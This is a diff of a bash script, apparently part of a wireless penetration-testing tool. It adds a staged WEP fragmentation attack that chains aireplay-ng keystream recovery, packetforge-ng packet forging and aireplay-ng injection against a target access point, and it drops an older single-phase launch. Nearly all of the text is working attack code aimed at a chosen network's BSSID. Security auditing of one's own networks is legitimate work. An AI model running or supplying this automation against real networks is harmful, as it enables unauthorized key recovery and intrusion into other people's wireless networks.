@@ -1620,11 +1620,10 @@ function exec_wep_allinone_attack() {
 			recalculate_windows_sizes
 			xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
 			wep_processes+=($!)
+		fi
 
-			recalculate_windows_sizes
-			xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-			wep_processes+=($!)
-			#TODO phase 2 and 3 of Fragmentation attack
+		if [ ${wep_fragmentation_phase} -lt 4 ]; then
+			wep_fragmentation_attack
 		fi
 
 		if [ ${wep_chopchop_phase} -lt 4 ]; then
@@ -1662,6 +1661,45 @@ function exec_wep_allinone_attack() {
 			manage_wep_pot
 		fi
 	fi
+}
+
+#Execute wep fragmentation attack on its different phases
+function wep_fragmentation_attack() {
+
+	debug_print
+
+	case ${wep_fragmentation_phase} in
+		1)
+			if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
+				wep_fragmentation_phase=2
+			else
+				wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fragmentation_phase1_pid} 2> /dev/null | head -n 1)
+				if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z ${wep_fragmentation_phase1_pid_alive} ]; then
+					wep_fragmentation_launched=1
+					recalculate_windows_sizes
+					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
+					wep_fragmentation_phase1_pid=$!
+					wep_processes+=(${wep_fragmentation_phase1_pid})
+				fi
+			fi
+		;;
+		2)
+			recalculate_windows_sizes
+			xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
+			wep_fragmentation_phase2_pid=$!
+			wep_processes+=(${wep_fragmentation_phase2_pid})
+			wep_fragmentation_phase=3
+		;;
+		3)
+			wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fragmentation_phase2_pid} 2> /dev/null | head -n 1)
+			if [ -z ${wep_fragmentation_phase2_pid_alive} ]; then
+				recalculate_windows_sizes
+				xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
+				wep_processes+=($!)
+				wep_fragmentation_phase=4
+			fi
+		;;
+	esac
 }
 
 #Execute wep chop-chop attack on its different phases
